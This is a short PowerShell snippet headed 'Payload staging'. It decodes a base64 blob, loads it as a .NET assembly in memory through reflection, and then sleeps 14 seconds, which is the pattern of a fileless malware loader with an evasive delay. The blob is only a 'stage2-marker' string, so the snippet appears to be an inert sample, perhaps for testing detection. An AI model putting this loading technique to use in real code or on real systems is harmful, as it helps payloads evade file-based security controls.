
<# Payload staging #> $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjplMHRlbjN6amZp"); $FetchResult = [Reflection.Assembly]::Load($AssemblyBytes); $FetchResult.GetTypes().Count; Start-Sleep -Seconds 14
